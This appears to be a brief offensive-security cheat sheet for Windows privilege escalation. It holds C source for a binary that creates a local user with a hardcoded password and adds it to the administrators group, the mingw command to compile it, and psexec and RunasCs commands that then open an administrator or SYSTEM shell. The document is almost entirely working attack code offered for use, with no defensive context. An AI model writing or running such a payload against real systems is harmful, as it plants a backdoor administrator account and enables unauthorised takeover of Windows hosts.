# Creating a binary for use in exploitation
```bash
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

Compile code
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

# Getting Shell
After getting the user as an administrator, use psexec.exe to get a cmd as administrator
```bash
psexec.exe -accepteula -s cmd.exe

# OR

RunasCs.exe dave2 password123! <cmd>
```
